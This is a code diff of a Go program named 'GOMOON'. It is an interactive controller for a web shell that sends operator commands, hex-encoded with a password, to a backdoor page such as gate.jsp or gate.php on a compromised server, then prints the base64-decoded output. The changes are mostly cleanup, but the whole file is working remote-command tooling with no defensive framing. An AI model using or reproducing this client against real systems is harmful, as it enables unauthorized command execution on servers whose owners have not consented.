@@ -13,7 +13,6 @@ import (
 )
 
 func main() {
-
 	var url string
 	var passwd string
 	flag.StringVar(&url, "url", "http://127.0.0.1:8082/gate.jsp|gate.php", "url")
@@ -23,7 +22,6 @@ func main() {
 	if flag.NFlag() != 2 {
 		flag.Usage()
 	}
-
 	reader := bufio.NewReader(os.Stdin)
 	for {
 		fmt.Print("# ")
@@ -31,41 +29,38 @@ func main() {
 		if err != nil {
 			fmt.Fprintln(os.Stderr, err)
 		}
-
-		if cmdString =="exit" {
+		commandStr := strings.TrimSuffix(cmdString, "\n")
+		if commandStr == "exit" {
 			os.Exit(0)
 		}
-
-		err = runCommand(url, passwd ,cmdString)
-		if err != nil {
-			fmt.Fprintln(os.Stderr, err)
+		if len(commandStr) > 0 {
+			err = runCommand(url, passwd, commandStr)
+			if err != nil {
+				fmt.Fprintln(os.Stderr, err)
+			}
 		}
 	}
-
 }
-
 
 func usage() {
 	fmt.Fprintf(os.Stderr, `
                         <------------GOMOON------------>
 		<---------WELCOME TO USE THIS PROGRAM--------->
 		<---------v1.0 - Author - ACE86 --------->
-		<---------Usage:   cmd  {xxx} -----Send a Command------>
+		<---------Usage:   cmd        -----Send a Command------>
 		<---------Usage:   exit       -----     exit     ------>
 `)
 	flag.PrintDefaults()
 }
 
-
 func runCommand(url, passwd, commandStr string) error {
-	var cmdBody  = "username="+hex.EncodeToString([]byte(commandStr)) +"&passwd="+hex.EncodeToString([]byte(passwd))
-    Post(url,cmdBody)
+	var cmdBody = "username=" + hex.EncodeToString([]byte(commandStr)) + "&passwd=" + hex.EncodeToString([]byte(passwd))
+	Post(url, cmdBody)
 	return nil
 
 }
 
-
-func Post(url , data string ) string {
+func Post(url, data string) string {
 	response, err := http.Post(url,
 		"application/x-www-form-urlencoded",
 		strings.NewReader(data))
@@ -74,18 +69,10 @@ func Post(url , data string ) string {
 	}
 	defer response.Body.Close()
 	result, _ := ioutil.ReadAll(response.Body)
-
-	//hexData, e := hex.DecodeString(string(result))
-
 	hexData, e := base64.URLEncoding.DecodeString(string(result))
-
-	if e !=nil {
+	if e != nil {
 		fmt.Println(e)
 	}
-	fmt.Println(string(hexData))
-
-	fmt.Println(string(result))
-
+	fmt.Print(string(hexData))
 	return string(result)
-
 }
